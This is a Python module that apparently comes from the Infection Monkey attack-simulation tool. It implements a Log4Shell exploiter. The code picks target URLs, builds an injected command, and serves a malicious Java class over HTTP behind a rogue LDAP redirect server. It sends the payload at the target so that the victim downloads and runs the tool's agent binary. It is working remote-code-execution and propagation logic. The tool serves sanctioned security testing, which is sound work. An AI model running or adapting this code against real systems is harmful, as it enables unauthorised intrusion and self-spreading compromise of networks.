import logging
from typing import Callable, Sequence, Set

from common import OperatingSystem
from common.common_consts.timeouts import LONG_REQUEST_TIMEOUT
from common.types import AgentID, Event, NetworkPort, SocketAddress
from infection_monkey.exploit import IAgentOTPProvider
from infection_monkey.exploit.tools import HTTPBytesServer
from infection_monkey.exploit.tools.web_tools import build_urls
from infection_monkey.i_puppet import ExploiterResultData, TargetHost
from infection_monkey.network import TCPPortSelector
from infection_monkey.network.tools import get_interface_to_target
from infection_monkey.utils.monkey_dir import get_monkey_dir_path
from infection_monkey.utils.threading import interruptible_iter

from .ldap_server import LDAPExploitServer
from .log4shell_command_builder import build_log4shell_command
from .log4shell_options import Log4ShellOptions
from .log4shell_utils import (
    LINUX_EXPLOIT_TEMPLATE_PATH,
    WINDOWS_EXPLOIT_TEMPLATE_PATH,
    build_exploit_bytecode,
)
from .plugin import Placeholder_Log4ShellExploitClient

logger = logging.getLogger(__name__)


SERVER_SHUTDOWN_TIMEOUT = LONG_REQUEST_TIMEOUT

AgentBinaryServerFactory = Callable[[TargetHost], HTTPBytesServer]


class Log4ShellExploiter:
    def __init__(
        self,
        agent_id: AgentID,
        log4shell_exploit_client: Placeholder_Log4ShellExploitClient,
        tcp_port_selector: TCPPortSelector,
        start_agent_binary_server: AgentBinaryServerFactory,
        otp_provider: IAgentOTPProvider,
    ):
        self._agent_id = agent_id
        self._log4shell_exploit_client = log4shell_exploit_client
        self._tcp_port_selector = tcp_port_selector
        self._start_agent_binary_server = start_agent_binary_server
        self._otp_provider = otp_provider

    def exploit_host(
        self,
        target_host: TargetHost,
        ports_to_try: Set[NetworkPort],
        servers: Sequence[str],
        current_depth: int,
        options: Log4ShellOptions,
        interrupt: Event,
    ) -> ExploiterResultData:
        self._host = target_host

        logger.info(f"Starting Log4Shell exploiter for host: {self._host.ip}")

        # Try to get potential urls
        potential_urls = _build_potential_urls(self._host, ports_to_try)
        if not potential_urls:
            msg = f"No potential URLs found for host: {self._host.ip}"
            logger.debug(msg)
            return ExploiterResultData(error_message=msg)

        self._configure_servers()

        try:
            logger.debug("Starting the Agent binary server")
            agent_binary_http_server = self._start_agent_binary_server(self._host)
        except Exception as err:
            msg = (
                "An unexpected exception occurred while attempting to start the Agent binary HTTP "
                f"server: {err}"
            )
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)

        command = build_log4shell_command(
            self._agent_id,
            self._host,
            servers,
            current_depth,
            agent_binary_http_server.download_url,
            self._otp_provider.get_otp(),
        )

        # Checking these beforehand so they don't cause unexpected exceptions
        # when trying to start the servers
        if any(
            [
                value is None
                for value in [
                    self._ldap_port,
                    self._class_http_server_ip,
                    self._class_http_server_port,
                ]
            ]
        ):
            msg = (
                "Could not assign ports/interfaces to one or more servers "
                "that are required for the exploit"
            )
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)

        # Start HTTP server to serve malicious java class to victim
        self._start_class_http_server(command)

        # Start LDAP server to redirect LDAP query to java class server
        self._start_ldap_server()

        try:
            logger.debug(
                f"Running Log4Shell command against potential URLs for host: {self._host.ip}"
            )
            return self._exploit_urls(
                options,
                agent_binary_http_server.bytes_downloaded,
                interrupt,
                potential_urls,
                command,
            )
        except Exception as err:
            msg = (
                "An unexpected exception occurred while attempting to exploit the host "
                f'"{self._host.ip}" with the Log4Shell exploiter: {err}'
            )
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)
        finally:
            _stop_agent_binary_http_server(
                agent_binary_http_server, options.agent_binary_download_timeout
            )
            self._stop_servers()

    def _configure_servers(self):
        self._ldap_port = self._tcp_port_selector.get_free_tcp_port()

        self._class_http_server_ip = get_interface_to_target(str(self._host.ip))
        self._class_http_server_port = self._tcp_port_selector.get_free_tcp_port()

        self._ldap_server = None
        self._exploit_class_http_server = None

    def _start_class_http_server(self, command: str):
        java_class = self._build_java_class(command)

        self._exploit_class_http_server = HTTPBytesServer(
            SocketAddress(ip=self._class_http_server_ip, port=self._class_http_server_port),
            java_class,
        )
        self._exploit_class_http_server.start()

    def _build_java_class(self, exploit_command: str) -> bytes:
        if OperatingSystem.LINUX == self._host.operating_system:
            return build_exploit_bytecode(exploit_command, LINUX_EXPLOIT_TEMPLATE_PATH)
        else:
            return build_exploit_bytecode(exploit_command, WINDOWS_EXPLOIT_TEMPLATE_PATH)

    def _start_ldap_server(self):
        self._ldap_server = LDAPExploitServer(
            ldap_server_port=self._ldap_port,  # type: ignore [arg-type]
            http_server_ip=self._class_http_server_ip,  # type: ignore [arg-type]
            http_server_port=self._class_http_server_port,  # type: ignore [arg-type]
            storage_dir=get_monkey_dir_path(),
        )
        self._ldap_server.run()

    def _stop_servers(self):
        try:
            logger.debug("Stopping the exploit class HTTP server")
            self._exploit_class_http_server.stop(  # type: ignore [union-attr]
                SERVER_SHUTDOWN_TIMEOUT
            )
        except Exception:
            logger.exception(
                "An unexpected error occurred while stopping the exploit class HTTP server"
            )

        try:
            logger.debug("Stopping the LDAP server")
            self._ldap_server.stop(SERVER_SHUTDOWN_TIMEOUT)  # type: ignore [union-attr]
        except Exception:
            logger.exception("An unexpected error occurred while stopping the LDAP server")

    def _exploit_urls(
        self,
        options: Log4ShellOptions,
        agent_binary_downloaded: Event,
        interrupt: Event,
        urls: Sequence[str],
        command: str,
    ) -> ExploiterResultData:
        """
        Attempt to exploit on all URLs
        """
        exploit_result = ExploiterResultData()

        for url in interruptible_iter(urls, interrupt):
            logger.debug(f"Attempting to exploit host: {self._host.ip} with URL: {url}")
            (
                exploit_result.exploitation_success,
                exploit_result.propagation_success,
            ) = self._log4shell_exploit_client.exploit(
                self._host, options, agent_binary_downloaded, url, command
            )

            if exploit_result.exploitation_success is True:
                break

        return exploit_result


def _build_potential_urls(target_host: TargetHost, ports_to_try: Set[NetworkPort]) -> Sequence[str]:
    potential_urls = build_urls(str(target_host.ip), [(str(p), False) for p in ports_to_try])
    logger.debug(f"Potential URLs: {potential_urls}")

    return potential_urls


def _stop_agent_binary_http_server(
    agent_binary_http_server: HTTPBytesServer, agent_binary_download_timeout: float
):
    try:
        logger.debug("Stopping the Agent binary server")
        agent_binary_http_server.stop(agent_binary_download_timeout)
    except Exception:
        logger.exception("An unexpected error occurred while stopping the HTTP server")
